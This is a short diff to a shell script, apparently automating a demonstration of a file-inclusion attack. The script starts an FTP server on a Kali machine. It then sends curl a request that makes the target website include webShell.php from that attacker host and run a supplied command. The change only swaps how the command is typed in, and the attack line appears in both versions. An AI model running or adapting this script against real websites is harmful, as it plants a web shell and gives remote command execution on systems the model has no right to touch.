@@ -18,8 +18,8 @@ cd "${SCRIPTS_DIR}/web/lfi/.files"
 python -m pyftpdlib -p 21 &
 FTP_PID=$!
 
-paste_command "curl -ks '${WEBSITE}ftp://${KALI_IP}:21/webShell.php&cmd=${CMD}'"
-xdotool key Return
+execute_command "curl -ks '${WEBSITE}ftp://${KALI_IP}:21/webShell.php&cmd=${CMD}'"
+create_new_line
 sleep 60
 
 kill $FTP_PID
